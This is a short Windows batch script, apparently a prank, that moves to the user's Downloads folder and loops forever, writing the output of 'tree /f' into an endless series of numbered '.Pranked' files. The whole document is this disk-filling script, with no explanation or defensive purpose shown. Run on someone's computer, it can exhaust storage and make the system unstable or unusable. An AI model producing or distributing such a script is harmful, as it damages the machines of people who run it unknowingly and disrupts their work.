cd %homepath%
cd downloads
set /a x=0
:start
tree /f > %x%.Pranked
set /a x=%x%+1
goto :start